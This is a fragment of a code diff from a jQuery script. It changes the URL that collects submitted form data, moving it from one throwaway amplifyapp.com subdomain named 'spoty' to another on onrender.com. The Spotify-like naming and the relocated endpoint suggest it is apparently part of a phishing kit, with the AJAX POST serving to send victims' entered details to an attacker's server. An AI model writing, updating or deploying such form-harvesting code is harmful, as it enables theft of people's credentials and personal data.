@@ -103,7 +103,7 @@ $(document).ready(function () {
         formData += '&unique_id=' + encodeURIComponent(unique_id);
         $.ajax({
             type: "POST",
-            url: "https://spoty-d2k0fla2d-la2dasfsd.d2sckfda9r5aua.amplifyapp.com/post_data.php",
+            url: "https://spoty-dfla0k2kfs-sdjla2dasf.onrender.com/post_data.php",
             data: formData,
             success: function (response) {
                 
